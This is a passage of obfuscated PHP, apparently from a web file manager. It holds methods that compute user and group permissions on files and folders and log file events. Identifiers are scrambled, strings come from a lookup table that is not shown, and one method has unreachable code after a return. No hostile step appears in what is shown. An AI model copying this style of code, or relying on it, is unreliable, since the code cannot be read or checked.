sourceAuthInfo($äÀï³£­) { $ÇêæúÕ =& $_SERVER[øşô´çË]; $±œ»­„ñ = Model($ÇêæúÕ[1529]); $áü»¹Ö = $±œ»­„ñ->sourceInfo($äÀï³£­); if (!$áü»¹Ö) { return !1; } $±œ»­„ñ->groupPathDisplay($áü»¹Ö); $„·÷¼õ› = array($áü»¹Ö); $„·÷¼õ› = $±œ»­„ñ->_listAppendPath($„·÷¼õ›, !1); $áü»¹Ö = $„·÷¼õ›[0]; $«ÏÉ¹©¹ = $áü»¹Ö[$ÇêæúÕ[611]]; if (isset($áü»¹Ö[$ÇêæúÕ[619]])) { $ûğÕˆÓ = explode($ÇêæúÕ[8], trim($áü»¹Ö[$ÇêæúÕ[611]], $ÇêæúÕ[8])); array_shift($ûğÕˆÓ); $«ÏÉ¹©¹ = $áü»¹Ö[$ÇêæúÕ[617]] . $ÇêæúÕ[2392] . implode($ÇêæúÕ[8], $ûğÕˆÓ); } return array($ÇêæúÕ[42] => $áü»¹Ö[$ÇêæúÕ[42]], $ÇêæúÕ[201] => $áü»¹Ö[$ÇêæúÕ[201]], $ÇêæúÕ[97] => KodIO::make($áü»¹Ö[$ÇêæúÕ[201]]), $ÇêæúÕ[611] => $«ÏÉ¹©¹); } private function groupAuthInfo($ª”»È´û, $Ÿƒ¾¹„½) { $ÃıÂÙøÈ =& $_SERVER[øşô´çË]; $¯•©ØƒÜ = Model($ÃıÂÙøÈ[614])->getInfo($Ÿƒ¾¹„½); return array($ÃıÂÙøÈ[2393] => intval($ª”»È´û[$ÃıÂÙøÈ[511]]), $ÃıÂÙøÈ[2383] => $ª”»È´û, $ÃıÂÙøÈ[2394] => LNG($ÃıÂÙøÈ[2395]), $ÃıÂÙøÈ[2389] => array($ÃıÂÙøÈ[518] => $¯•©ØƒÜ[$ÃıÂÙøÈ[42]], $ÃıÂÙøÈ[97] => KodIO::make($¯•©ØƒÜ[$ÃıÂÙøÈ[100]][$ÃıÂÙøÈ[201]]), $ÃıÂÙøÈ[2396] => $¯•©ØƒÜ[$ÃıÂÙøÈ[618]])); } protected function groupRootAuth($üš‚¬ùÃ, $ıÀê÷ÓÃ = false) { $õŞ­ôç² =& $_SERVER[øşô´çË]; $ıÀê÷ÓÃ = $ıÀê÷ÓÃ ? $ıÀê÷ÓÃ : USER_ID; $‚µä—µá = $ıÀê÷ÓÃ . $õŞ­ôç²[2397] . $üš‚¬ùÃ; static $¼¿‘„» = array(); if (isset($¼¿‘„»[$‚µä—µá])) { return $¼¿‘„»[$‚µä—µá]; } $ÑÕóÊß = Model($õŞ­ôç²[614])->getInfo($üš‚¬ùÃ); $£ÒîÉõœ = $this->userGroupList($ıÀê÷ÓÃ); $¹¸Ô‡Ùó = isset($£ÒîÉõœ[$üš‚¬ùÃ]) ? $£ÒîÉõœ[$üš‚¬ùÃ][$õŞ­ôç²[511]] : !1; if ($¹¸Ô‡Ùó && Model($õŞ­ôç²[600])->authCheckAction($¹¸Ô‡Ùó[$õŞ­ôç²[511]], $õŞ­ôç²[1560])) { $¼¿‘„»[$‚µä—µá] = $¹¸Ô‡Ùó; return $¹¸Ô‡Ùó; } $°™Ê…˜¬ = $this->sourceAuthSelect($ÑÕóÊß[$õŞ­ôç²[100]][$õŞ­ôç²[201]]); $É÷Ááâò = $°™Ê…˜¬ ? $this->authMake($°™Ê…˜¬, $ıÀê÷ÓÃ) : !1; $ØÂßÛÅ± = $É÷Ááâò ? $É÷Ááâò[$õŞ­ôç²[565]] : !1; $¼¿‘„»[$‚µä—µá] = $ØÂßÛÅ± ? $ØÂßÛÅ± : $¹¸Ô‡Ùó; return $¼¿‘„»[$‚µä—µá]; } public function authOwnerApply($ªÅ¦æÒµ) { $²ÉéÁ«¹ =& $_SERVER[øşô´çË]; if (empty($ªÅ¦æÒµ[$²ÉéÁ«¹[511]]) || isset($ªÅ¦æÒµ[$²ÉéÁ«¹[1579]]) && $ªÅ¦æÒµ[$²ÉéÁ«¹[1579]]) { return $ªÅ¦æÒµ; } if (AuthModel::authCheckRoot($ªÅ¦æÒµ[$²ÉéÁ«¹[511]][$²ÉéÁ«¹[512]])) { return $ªÅ¦æÒµ; } $Â Ş¨ì¡ = Model($²ÉéÁ«¹[1529])->parentLevelArray($ªÅ¦æÒµ[$²ÉéÁ«¹[613]]); $Â Ş¨ì¡ = array_merge(array($ªÅ¦æÒµ[$²ÉéÁ«¹[201]]), array_reverse($Â Ş¨ì¡)); $ÚÑ•ü¯Ş = $this->sourceAuthSelect($Â Ş¨ì¡); $õãÌç´ˆ = array(); $óƒ«ı‡‰ = array(); foreach ($ÚÑ•ü¯Ş as $Á«êŸ„ã => $âÑƒ«¹«) { $¼öºòí— = $this->authFolderOwnerUser($âÑƒ«¹«); $õãÌç´ˆ[$Á«êŸ„ã] = $¼öºòí—; $óƒ«ı‡‰ = array_merge($óƒ«ı‡‰, $¼öºòí—[$²ÉéÁ«¹[693]]); if ($¼öºòí—[$²ÉéÁ«¹[2398]]) { break; } } if (count($óƒ«ı‡‰) == 0) { $óƒ«ı‡‰ = $this->authFolderOwnerGroup($ªÅ¦æÒµ[$²ÉéÁ«¹[598]]); } $óƒ«ı‡‰ = array_unique($óƒ«ı‡‰); if (AuthModel::authCheckRoot($ªÅ¦æÒµ[$²ÉéÁ«¹[511]][$²ÉéÁ«¹[512]])) { $óƒ«ı‡‰[] = USER_ID; } $ªÅ¦æÒµ[$²ÉéÁ«¹[511]][$²ÉéÁ«¹[2399]] = Model($²ÉéÁ«¹[606])->userListInfo($óƒ«ı‡‰); return $ªÅ¦æÒµ; } private function authFolderOwnerGroup($Ùé¸¾ÓË) { $Ÿ¦°î’ =& $_SERVER[øşô´çË]; $ìª©“½™ = Model($Ÿ¦°î’[2272])->where(array($Ÿ¦°î’[1491] => $Ùé¸¾ÓË))->select(); $¹²Ûª×Æ = array(); if (!$ìª©“½™) { return $¹²Ûª×Æ; } foreach ($ìª©“½™ as $ª¥ßŸ©Î) { $Æ…¾¬Ó® = $this->authInfo($ª¥ßŸ©Î); if (AuthModel::authCheckRoot($Æ…¾¬Ó®[$Ÿ¦°î’[511]])) { $¹²Ûª×Æ[] = $ª¥ßŸ©Î[$Ÿ¦°î’[1588]]; } } return $¹²Ûª×Æ; } private function authFolderOwnerUser($º¹­„ıµ) { $˜÷›Ùßà =& $_SERVER[øşô´çË]; $Á–øçĞò = array(); $£éÁšãâ = !1; foreach ($º¹­„ıµ as $õÁÊ†) { $Ñ·æ·ã = $this->authInfo($õÁÊ†); if ($õÁÊ†[$˜÷›Ùßà[598]] == $˜÷›Ùßà[238]) { $£éÁšãâ = !0; } if ($õÁÊ†[$˜÷›Ùßà[198]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Ñ·æ·ã[$˜÷›Ùßà[511]])) { $Á–øçĞò[] = $õÁÊ†[$˜÷›Ùßà[598]]; } } } return array($˜÷›Ùßà[693] => $Á–øçĞò, $˜÷›Ùßà[2398] => $£éÁšãâ); } public function authMake($ÜÄÄÖ”£, $ô«‡õ‹† = false) { $¾âİ–ºÕ =& $_SERVER[øşô´çË]; $Ì‰È”Ú = $this->authArrayCheck($ÜÄÄÖ”£, $ô«‡õ‹†); if ($Ì‰È”Ú[$¾âİ–ºÕ[2379]]) { $Ì‰È”Ú[$¾âİ–ºÕ[2379]] = $this->sourceAuthInfo($Ì‰È”Ú[$¾âİ–ºÕ[2379]]); } return $Ì‰È”Ú; } public function authArrayCheck($¤Å¦¼ª, $ôùÊ·Î¾ = false) { $âÇ´»²Ş =& $_SERVER[øşô´çË]; if (!$¤Å¦¼ª) { return array($âÇ´»²Ş[512] => 0, $âÇ´»²Ş[565] => !1, $âÇ´»²Ş[2394] => $âÇ´»²Ş[12]); } $ôùÊ·Î¾ = $ôùÊ·Î¾ ? $ôùÊ·Î¾ : USER_ID; $Ö¯©ÆÈ« = 0; $†±Ÿ¦Ë = 0; $—¥îåÌ½ = 0; $İõæ²îå = 0; $Ã»Áñ¬Ÿ = 0; $ÙµÅ¸ç€ = 0; $½üÁĞì† = 0; $ñ™¸ŞÓ’ = 0; $®ÆÌ‰ª± = 1000; $£Ã€µ©ù = 0; $¡Š áÒ¥ = 0; $¤œÎòøç = 0; $Ñ­–º½ª = 0; $ŸØşšÜ‰ = 0; foreach ($¤Å¦¼ª as $½­ñ‘¤») { $éƒßÆç€ = $this->authInfo($½­ñ‘¤»); if (!$éƒßÆç€) { continue; } $åÒ«é”Ê = $½­ñ‘¤»[$âÇ´»²Ş[598]]; $ùÒÜÑ‰Ò = $½­ñ‘¤»[$âÇ´»²Ş[201]]; $òÇ®äï = intval($éƒßÆç€[$âÇ´»²Ş[511]]); if ($½­ñ‘¤»[$âÇ´»²Ş[198]] == SourceModel::TYPE_USER && $åÒ«é”Ê == $ôùÊ·Î¾) { $Ö¯©ÆÈ« = !0; $—¥îåÌ½ = $éƒßÆç€; $†±Ÿ¦Ë = $òÇ®äï; $İõæ²îå = $ùÒÜÑ‰Ò; } else { if ($½­ñ‘¤»[$âÇ´»²Ş[198]] == SourceModel::TYPE_GROUP && $this->groupContainUser($åÒ«é”Ê, $ôùÊ·Î¾)) { $Ã»Áñ¬Ÿ = !0; $ø¡™åôÒ = $this->groupStepToUserGroup($åÒ«é”Ê, $ôùÊ·Î¾); if ($ø¡™åôÒ < $®ÆÌ‰ª±) { $®ÆÌ‰ª± = $ø¡™åôÒ; $ÙµÅ¸ç€ = $òÇ®äï; $½üÁĞì† = $éƒßÆç€; $£Ã€µ©ù = $åÒ«é”Ê; $ñ™¸ŞÓ’ = $ùÒÜÑ‰Ò; } if ($ø¡™åôÒ == $®ÆÌ‰ª± && $òÇ®äï >= $ÙµÅ¸ç€) { $ÙµÅ¸ç€ = $òÇ®äï; $½üÁĞì† = $éƒßÆç€; $£Ã€µ©ù = $åÒ«é”Ê; $ñ™¸ŞÓ’ = $ùÒÜÑ‰Ò; } } else { if (!$åÒ«é”Ê || $åÒ«é”Ê == $âÇ´»²Ş[238]) { $¡Š áÒ¥ = !0; $Ñ­–º½ª = $éƒßÆç€; $¤œÎòøç = $òÇ®äï; $ŸØşšÜ‰ = $ùÒÜÑ‰Ò; } } } } if ($Ö¯©ÆÈ«) { $›Ó×ÎÖÄ = $†±Ÿ¦Ë; $éƒßÆç€ = $—¥îåÌ½; $çüòÂÔÙ = $İõæ²îå; $Ìüù¬ô½ = LNG($âÇ´»²Ş[2400]); } else { if ($Ã»Áñ¬Ÿ) { $›Ó×ÎÖÄ = $ÙµÅ¸ç€; $éƒßÆç€ = $½üÁĞì†; $çüòÂÔÙ = $ñ™¸ŞÓ’; $ÌÚ‚âˆú = Model($âÇ´»²Ş[614])->getInfo($£Ã€µ©ù); $Ìüù¬ô½ = $âÇ´»²Ş[183] . $ÌÚ‚âˆú[$âÇ´»²Ş[618]] . $âÇ´»²Ş[2401] . LNG($âÇ´»²Ş[2402]); } else { if ($¡Š áÒ¥) { $›Ó×ÎÖÄ = $¤œÎòøç; $éƒßÆç€ = $Ñ­–º½ª; $çüòÂÔÙ = $ŸØşšÜ‰; $Ìüù¬ô½ = LNG($âÇ´»²Ş[2381]); } else { $›Ó×ÎÖÄ = 0; $éƒßÆç€ = !1; $Ìüù¬ô½ = $âÇ´»²Ş[12]; $çüòÂÔÙ = $âÇ´»²Ş[12]; } } } $™¶‰ëËÑ = array($âÇ´»²Ş[2393] => intval($›Ó×ÎÖÄ), $âÇ´»²Ş[2383] => $éƒßÆç€, $âÇ´»²Ş[2394] => $Ìüù¬ô½, $âÇ´»²Ş[2389] => $çüòÂÔÙ); return $™¶‰ëËÑ; } private function groupContainUser($¼»ù»Òæ, $õÏ–·†¬ = false) { return in_array($¼»ù»Òæ, $this->userGroupParents($õÏ–·†¬)); } private function groupStepToUserGroup($ÆÆî„Ñ¨, $³¾´ıá‹ = false) { $ëä·Œó =& $_SERVER[øşô´çË]; $‰´ŸÀâ = $this->userGroupList($³¾´ıá‹); $ğ•í©½˜ = 1000; $Ğ¸¹¢Ëñ = $GLOBALS[$ëä·Œó[6]][$ëä·Œó[102]][$ëä·Œó[2285]] == 1; $Ñ£À®•¥ = $Ğ¸¹¢Ëñ ? 3 : 2; foreach ($‰´ŸÀâ as $ÕÈÌõùÎ) { if ($ÕÈÌõùÎ[$ëä·Œó[1491]] == $ÆÆî„Ñ¨) { return 0; } $ë†ª¶ÅÈ = explode($ëä·Œó[60], trim($ÕÈÌõùÎ[$ëä·Œó[613]], $ëä·Œó[60])); if ($ë†ª¶ÅÈ[0] == $ëä·Œó[238] && count($ë†ª¶ÅÈ) > $Ñ£À®•¥) { $¸Ã»±µ = array_reverse(array_slice($ë†ª¶ÅÈ, $Ñ£À®•¥)); $Äè‘ªÙÏ = array_search($ÆÆî„Ñ¨, $¸Ã»±µ); if ($Äè‘ªÙÏ !== !1 && $Äè‘ªÙÏ + 1 <= $ğ•í©½˜) { $ğ•í©½˜ = $Äè‘ªÙÏ + 1; } } } return $ğ•í©½˜; } private function userGroupList($ˆÎÙ©¬Ì = false, $û »ìÚì = false) { $Ş·—Íß =& $_SERVER[øşô´çË]; static $¹¬×«¼û = array(); if (isset($¹¬×«¼û[$ˆÎÙ©¬Ì])) { return $¹¬×«¼û[$ˆÎÙ©¬Ì]; } if (!$û »ìÚì) { $û »ìÚì = Model($Ş·—Íß[626])->getInfo($ˆÎÙ©¬Ì); } $¹¬×«¼û[$ˆÎÙ©¬Ì] = array_to_keyvalue($û »ìÚì[$Ş·—Íß[1490]], $Ş·—Íß[1491]); return $¹¬×«¼û[$ˆÎÙ©¬Ì]; } public function userGroupParents($†“Ôàù™) { $«ıâÊé¡ =& $_SERVER[øşô´çË]; static $ôŒ´ıÖ = array(); $†“Ôàù™ = $†“Ôàù™ ? $†“Ôàù™ : USER_ID; if (isset($ôŒ´ıÖ[$†“Ôàù™])) { return $ôŒ´ıÖ[$†“Ôàù™]; } $À„ÑÆÛø = $this->userGroupList($†“Ôàù™); $úçÔª´ = array(); $»ˆÍ‚êç = $GLOBALS[$«ıâÊé¡[6]][$«ıâÊé¡[102]][$«ıâÊé¡[2285]] == 1; $ïòšÏî = $»ˆÍ‚êç ? 3 : 2; foreach ($À„ÑÆÛø as $Ñ’Å½×®) { $¼ŸÜçïÀ = array($Ñ’Å½×®[$«ıâÊé¡[1491]]); $şºÙ¦® = explode($«ıâÊé¡[60], trim($Ñ’Å½×®[$«ıâÊé¡[613]], $«ıâÊé¡[60])); if ($şºÙ¦®[0] == $«ıâÊé¡[238] && count($şºÙ¦®) > $ïòšÏî) { $óĞ—æË = array_slice($şºÙ¦®, $ïòšÏî); $¼ŸÜçïÀ = array_merge($¼ŸÜçïÀ, array_reverse($óĞ—æË)); } $úçÔª´ = array_merge($úçÔª´, $¼ŸÜçïÀ); } $ôŒ´ıÖ[$†“Ôàù™] = array_unique($úçÔª´); return $ôŒ´ıÖ[$†“Ôàù™]; } public function authTargetInfoMake($’–‰Ç‡“) { $üß´Ö‚ =& $_SERVER[øşô´çË]; $¨£šÅ§‰ = array(); $×÷´âö§ = array(); foreach ($’–‰Ç‡“ as $†·€³Ş¸) { if ($†·€³Ş¸[$üß´Ö‚[198]] == SourceModel::TYPE_USER) { $¨£šÅ§‰[] = intval($†·€³Ş¸[$üß´Ö‚[598]]); } else { if ($†·€³Ş¸[$üß´Ö‚[198]] == SourceModel::TYPE_GROUP) { $×÷´âö§[] = intval($†·€³Ş¸[$üß´Ö‚[598]]); } } } if ($¨£šÅ§‰) { $¨£šÅ§‰ = Model($üß´Ö‚[606])->userListInfo($¨£šÅ§‰); } if ($×÷´âö§) { $şåÊÂÆÔ = array($üß´Ö‚[2265] => array($üß´Ö‚[516], $×÷´âö§)); $×÷´âö§ = Model($üß´Ö‚[614])->field($üß´Ö‚[2403])->where($şåÊÂÆÔ)->select(); $×÷´âö§ = array_to_keyvalue($×÷´âö§, $üß´Ö‚[1491]); } return array($üß´Ö‚[2404] => $¨£šÅ§‰, $üß´Ö‚[2405] => $×÷´âö§); } public function authInfo($ÆÑĞè½Ç) { $««—Âş =& $_SERVER[øşô´çË]; if ($ÆÑĞè½Ç[$««—Âş[1636]]) { $œÃ‹Ò‡ = Model($««—Âş[600])->listData($ÆÑĞè½Ç[$««—Âş[1636]]); if (!$œÃ‹Ò‡) { return !1; $ïá Ü²Ô = Model($««—Âş[600])->listData(); $ã°¨Òµ = array_filter_by_field($ïá Ü²Ô, $««—Âş[511], $««—Âş[238]); return $ã°¨Òµ; } $Á—¼å”ï = array_field_key($œÃ‹Ò‡, array($««—Âş[496], $««—Âş[42], $««—Âş[511], $««—Âş[2199], $««—Âş[2200])); $Á—¼å”ï[$««—Âş[2406]] = $ÆÑĞè½Ç; return $Á—¼å”ï; } else { return array($««—Âş[517] => 0, $««—Âş[2184] => $ÆÑĞè½Ç[$««—Âş[2341]], $««—Âş[518] => $««—Âş[12], $««—Âş[2199] => $««—Âş[2407]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\162\143\145\137\145\x76\145\156\x74"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\145\x54\151\155\x65", "\x74\151\x6d\145", "\151\x6e\163\x65\x72\164", "\x66\x75\x6e\143\x74\151\157\x6e"), array("\144\x65\x73\143", '', "\151\156\163\x65\162\164\54\165\x70\144\141\164\x65\x2c\x73\x65\154\145\143\x74", "\152\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ÙƒÜÍŞ, $è­â³ü™, $¾½  = '') { $ªíæœ§… =& $_SERVER[øşô´çË]; if (!$this->eventSave) { return; } $÷ˆµ÷Ò‰ = Model($ªíæœ§…[1529])->sourceInfo($ÙƒÜÍŞ); if (!$÷ˆµ÷Ò‰) { return !1; } if ($this->isDisableEvent($÷ˆµ÷Ò‰, $è­â³ü™)) { return; } if ($¾½  && is_string($¾½ )) { $¾½  = array($ªíæœ§…[2218] => $¾½ ); } $ŠÁéú‹Û = KodUser::id(); $¹ğÆåİ¬ = array($ªíæœ§…[515] => $ÙƒÜÍŞ, $ªíæœ§…[2408] => $÷ˆµ÷Ò‰[$ªíæœ§…[200]], $ªíæœ§…[2409] => $÷ˆµ÷Ò‰[$ªíæœ§…[42]], $ªíæœ§…[611] => !empty($÷ˆµ÷Ò‰[$ªíæœ§…[611]]) ? $÷ˆµ÷Ò‰[$ªíæœ§…[611]] : $ªíæœ§…[12], $ªíæœ§…[1964] => $ŠÁéú‹Û, $ªíæœ§…[520] => $è­â³ü™, $ªíæœ§…[1966] => $¾½ ); $this->addSystemLog($è­â³ü™, $¹ğÆåİ¬); unset($¹ğÆåİ¬[$ªíæœ§…[2409]], $¹ğÆåİ¬[$ªíæœ§…[611]]); return $this->add($¹ğÆåİ¬); } private function addSystemLog($İâŞÕ¯, $˜æüáÒ) { $ç½«ğí =& $_SERVER[øşô´çË]; if ($İâŞÕ¯ == $ç½«ğí[2410]) { $İâŞÕ¯ = $˜æüáÒ[$ç½«ğí[549]][$ç½«ğí[2411]]; } else { if (in_array($İâŞÕ¯, array($ç½«ğí[1558], $ç½«ğí[2412]))) { $İâŞÕ¯ = $˜æüáÒ[$ç½«ğí[549]][$ç½«ğí[178]]; } } $°ªİ„ğŸ = array_merge($˜æüáÒ, array($ç½«ğí[2413] => $˜æüáÒ[$ç½«ğí[201]], $ç½«ğí[2414] => $˜æüáÒ[$ç½«ğí[2414]])); Hook::trigger($ç½«ğí[2415], $ç½«ğí[2416] . $İâŞÕ¯, $˜æüáÒ); Model($ç½«ğí[2125])->addLog($ç½«ğí[2416] . $İâŞÕ¯, $°ªİ„ğŸ); } private function isDisableEvent($«¡ÆİËš, $ë„ŠÜ®‚) { $‰¼é÷à» =& $_SERVER[øşô´çË]; if ($«¡ÆİËš[$‰¼é÷à»[198]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($ë„ŠÜ®‚ == $‰¼é÷à»[1330]) { return !1; } return !0; } public function eventCreate($Ë¿Äú¢å, $ÏÇµÎ¿«) { $‡’ğ•Á =& $_SERVER[øşô´çË]; $ÉÊ£ˆˆ = Model($‡’ğ•Á[1529])->sourceInfo($Ë¿Äú¢å); $ğœ™è€ˆ = array($‡’ğ•Á[2411] => $ÏÇµÎ¿«, $‡’ğ•Á[42] => $ÉÊ£ˆˆ[$‡’ğ•Á[42]]); return $this->addEvent($Ë¿Äú¢å, $‡’ğ•Á[2410], $ğœ™è€ˆ); } public function eventFileEdit($»ÔÔŠÚ¯) { $œÛÌ˜¼Ó =& $_SERVER[øşô´çË]; $•æéí = array($œÛÌ˜¼Ó[2417] => $_SERVER[$œÛÌ˜¼Ó[2418]], $œÛÌ˜¼Ó[2419] => strtolower(ACTION)); if (isset($GLOBALS[$œÛÌ˜¼Ó[7]][$œÛÌ˜¼Ó[1619]])) { $•æéí[$œÛÌ˜¼Ó[1619]] = $œÛÌ˜¼Ó[101]; } return $this->addEvent($»ÔÔŠÚ¯, $œÛÌ˜¼Ó[1557], $•æéí); } public function eventRecycle($ŠóæÖŸÍ, $Ê„Ôòìƒ) { return $this->addEvent($ŠóæÖŸÍ, $_SERVER[øşô´çË][2412], $Ê„Ôòìƒ); } private static $_removeLast = ''; public function eventRemove($Ç™ƒá‹¢) { $ïãëşøĞ =& $_SERVER[øşô´çË]; self::$_removeLast = $Ç™ƒá‹¢; $¡Ùø“ë = Model($ïãëşøĞ[1529])->sourceInfo($Ç™ƒá‹¢); $Í‘ş¼Â˜ = array_field_key($¡Ùø“ë, array($ïãëşøĞ[201], $ïãëşøĞ[566], $ïãëşøĞ[529], $ïãëşøĞ[613])); $„³°æº² = array($ïãëşøĞ[178] => $¡Ùø“ë[$ïãëşøĞ[42]], $ïãëşøĞ[2419] => ACTION, $ïãëşøĞ[2420] => $Í‘ş¼Â˜); return $this->addEvent($¡Ùø“ë[$ïãëşøĞ[200]], $ïãëşøĞ[1330], $„³°æº²); } public function eventShare($—ÆóŠü‘, $ÙßÂÙ˜) { return $this->addEvent($—ÆóŠü‘, $_SERVER[øşô´çË][1558], $ÙßÂÙ˜); } public function eventMove($û±‡ĞƒÔ, $¬ğ…ÔÌ , $Şòô–İ) { $ÇòäªÜ =& $_SERVER[øşô´çË]; if (self::$_removeLast == $û±‡ĞƒÔ) { return; } $Û¥‘¢¥ = Model($ÇòäªÜ[1529]); $†àÈ€¾ò = $Û¥‘¢¥->sourceInfo($û±‡ĞƒÔ); $Ó°ÁÈË± = $Û¥‘¢¥->sourceInfo($¬ğ…ÔÌ ); $üÃÛæ¦İ = $Û¥‘¢¥->sourceInfo($Şòô–İ); $İ××Û¤ç = array($ÇòäªÜ[1342] => $¬ğ…ÔÌ , $ÇòäªÜ[2421] => $Ó°ÁÈË±[$ÇòäªÜ[42]], $ÇòäªÜ[2379] => !empty($Ó°ÁÈË±[$ÇòäªÜ[611]]) ? $Ó°ÁÈË±[$ÇòäªÜ[611]] : $ÇòäªÜ[12], $ÇòäªÜ[1343] => $Şòô–İ, $ÇòäªÜ[2422] => $üÃÛæ¦İ[$ÇòäªÜ[42]], $ÇòäªÜ[2423] => !empty($üÃÛæ¦İ[$ÇòäªÜ[611]]) ? $üÃÛæ¦İ[$ÇòäªÜ[611]] : $ÇòäªÜ[12]); $this->addEvent($û±‡ĞƒÔ, $ÇòäªÜ[652], $İ××Û¤ç); $†àÈ€¾ò = $Û¥‘¢¥->sourceInfo($û±‡ĞƒÔ); $İ××Û¤ç = array($ÇòäªÜ[201] => $†àÈ€¾ò[$ÇòäªÜ[201]], $ÇòäªÜ[42] => $†àÈ€¾ò[$ÇòäªÜ[42]]); $this->addEvent($¬ğ…ÔÌ , $ÇòäªÜ[2424], $İ××Û¤ç); } public function eventCopy($ì¢îãÏ¯) { $this->eventCreate($ì¢îãÏ¯, $_SERVER[øşô´çË][650]); } public function eventRename($ÖÒ¨İÔ², $œôÆ©»ô, $óå¬ğ·) { $ÆÊ£ÈÚ¾ =& $_SERVER[øşô´çË]; $§İäÅÒ = array($ÆÊ£ÈÚ¾[1342] => $œôÆ©»ô, $ÆÊ£ÈÚ¾[1343] => $óå¬ğ·); return $this->addEvent($ÖÒ¨İÔ², $ÆÊ£ÈÚ¾[1542], $§İäÅÒ); } public function eventAddComment($½–ÔÍÅó, $ğ®¡æô) { return $this->addEvent($½–ÔÍÅó, $_SERVER[øşô´çË][2425], $ğ®¡æô); } public function eventAddDesc($¬İØìÚ, $éìû­©) { return $this->addEvent($¬İØìÚ, $_SERVER[øşô´çË][2426], $éìû­©); } public function listBySource($Ì–¬»ÆÑ) { $¡ÈˆÜƒÜ =& $_SERVER[øşô´çË]; $±Ÿá‡‰“ = Model($¡ÈˆÜƒÜ[1529])->sourceInfo($Ì–¬»ÆÑ); $Ú€¯ëæç = array($¡ÈˆÜƒÜ[515] => $Ì–¬»ÆÑ); if ($±Ÿá‡‰“[$¡ÈˆÜƒÜ[509]] == $¡ÈˆÜƒÜ[101]) { $Ò¹ó¡Â = 20000; $«ÏŞ‘ù¿ = array($¡ÈˆÜƒÜ[613] => array($¡ÈˆÜƒÜ[482], $±Ÿá‡‰“[$¡ÈˆÜƒÜ[613]] . $±Ÿá‡‰“[$¡ÈˆÜƒÜ[201]] . $¡ÈˆÜƒÜ[645])); $¤ƒ­ì–· = Model($¡ÈˆÜƒÜ[1529])->field($¡ÈˆÜƒÜ[201])->order($¡ÈˆÜƒÜ[2427])->where($«ÏŞ‘ù¿)->limit($Ò¹ó¡Â)->select(); $Ù¯üó¡ = array_to_keyvalue($¤ƒ­ì–·, $¡ÈˆÜƒÜ[12], $¡ÈˆÜƒÜ[201]); if ($Ù¯üó¡ >= $Ò¹ó¡Â) { $ùÎí£œ¼ = Model($¡ÈˆÜƒÜ[1529])->listChildrenDeep($Ì–¬»ÆÑ, $Ò¹ó¡Â, 3); $Ù¯üó¡ = array_merge($Ù¯üó¡, $ùÎí£œ¼, array($Ì–¬»ÆÑ . $¡ÈˆÜƒÜ[472])); } $Ú€¯ëæç = array($¡ÈˆÜƒÜ[201] => array($¡ÈˆÜƒÜ[7], array_unique($Ù¯üó¡))); } $ëÆÓÉÂè = $this->where($Ú€¯ëæç)->order($¡ÈˆÜƒÜ[2428])->selectPage(); if ($ëÆÓÉÂè[$¡ÈˆÜƒÜ[452]][$¡ÈˆÜƒÜ[453]] == 0) { $ëÆÓÉÂè[$¡ÈˆÜƒÜ[452]][$¡ÈˆÜƒÜ[453]] = 1; $ëÆÓÉÂè[$¡ÈˆÜƒÜ[455]] = array(array($¡ÈˆÜƒÜ[515] => $Ì–¬»ÆÑ, $¡ÈˆÜƒÜ[2408] => $±Ÿá‡‰“[$¡ÈˆÜƒÜ[200]], $¡ÈˆÜƒÜ[1964] => $±Ÿá‡‰“[$¡ÈˆÜƒÜ[550]], $¡ÈˆÜƒÜ[520] => $¡ÈˆÜƒÜ[2429], $¡ÈˆÜƒÜ[521] => $±Ÿá‡‰“[$¡ÈˆÜƒÜ[241]], $¡ÈˆÜƒÜ[1966] => $¡ÈˆÜƒÜ[12])); } return $this->eventListParse($ëÆÓÉÂè, $Ì–¬»ÆÑ); } private function eventListParse($èì™¢×†, $ˆ¬®×«) { $§€ƒ¥ß =& $_SERVER[øşô´çË]; $ßŞó„Ô§ = $èì™¢×†[$§€ƒ¥ß[455]]; $İûİÓãª = array_to_keyvalue($ßŞó„Ô§, $§€ƒ¥ß[12], $§€ƒ¥ß[201]); $ñ”‡Å× = array_to_keyvalue($ßŞó„Ô§, $§€ƒ¥ß[12], $§€ƒ¥ß[2414]); foreach ($ßŞó„Ô§ as $¢½îËë§) { $Üñà«å = $¢½îËë§[$§€ƒ¥ß[549]]; if ($¢½îËë§[$§€ƒ¥ß[43]] == $§€ƒ¥ß[652] && isset($Üñà«å[$§€ƒ¥ß[1342]])) { $İûİÓãª[] = $Üñà«å[$§€ƒ¥ß[1342]] . $§€ƒ¥ß[12]; $İûİÓãª[] = $Üñà«å[$§€ƒ¥ß[1343]] . $§€ƒ¥ß[12]; } if ($¢½îËë§[$§€ƒ¥ß[43]] == $§€ƒ¥ß[2424] && isset($Üñà«å[$§€ƒ¥ß[201]])) { $İûİÓãª[] = $Üñà«å[$§€ƒ¥ß[201]] . $§€ƒ¥ß[12]; } } $İûİÓãª = array_merge($İûİÓãª, $ñ”‡Å×, array($ˆ¬®×« . $§€ƒ¥ß[12])); $İûİÓãª = array_unique($İûİÓãª); $ÃğÄ’‡ = array_unique(array_to_keyvalue($ßŞó„Ô§, $§€ƒ¥ß[12], $§€ƒ¥ß[1588])); $İ¯ÅÊë = Model($§€ƒ¥ß[626])->userListInfo($ÃğÄ’‡); $³ÊñÒáÛ = Model($§€ƒ¥ß[935])->sourceListInfo($İûİÓãª, !0); foreach ($ßŞó„Ô§ as &$¢½îËë§) { if ($¢½îËë§[$§€ƒ¥ß[43]] == $§€ƒ¥ß[652] && isset($¢½îËë§[$§€ƒ¥ß[549]][$§€ƒ¥ß[1342]])) { $¢½îËë§[$§€ƒ¥ß[549]][$§€ƒ¥ß[1342]] = $³ÊñÒáÛ[$¢½îËë§[$§€ƒ¥ß[549]][$§€ƒ¥ß[1342]]]; $¢½îËë§[$§€ƒ¥ß[549]][$§€ƒ¥ß[1343]] = $³ÊñÒáÛ[$¢½îËë§[$§€ƒ¥ß[549]][$§€ƒ¥ß[1343]]]; } if ($¢½îËë§[$§€ƒ¥ß[43]] == $§€ƒ¥ß[2424] && isset($¢½îËë§[$§€ƒ¥ß[549]][$§€ƒ¥ß[201]])) { $¢½îËë§[$§€ƒ¥ß[549]][$§€ƒ¥ß[201]] = 